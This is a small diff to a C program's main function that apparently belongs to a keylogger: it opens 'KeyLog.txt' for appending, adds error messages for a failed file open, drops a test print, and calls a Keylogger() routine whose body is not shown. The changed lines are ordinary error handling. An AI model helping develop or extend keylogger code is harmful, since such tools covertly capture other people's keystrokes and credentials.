@@ -10,8 +10,13 @@ int main(void)
     err = fopen_s(&LogFile, "C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+");
 
     if (err != 0)
+    {
+        printf("Error opening file: %d\n", err);
+        if (err == EACCES)
+            printf("Permission denied or file already in use\n");
         return 1;
-    printf("Test\n");
+    }
+    
     if (Keylogger() == false)
     {
         fclose(LogFile);
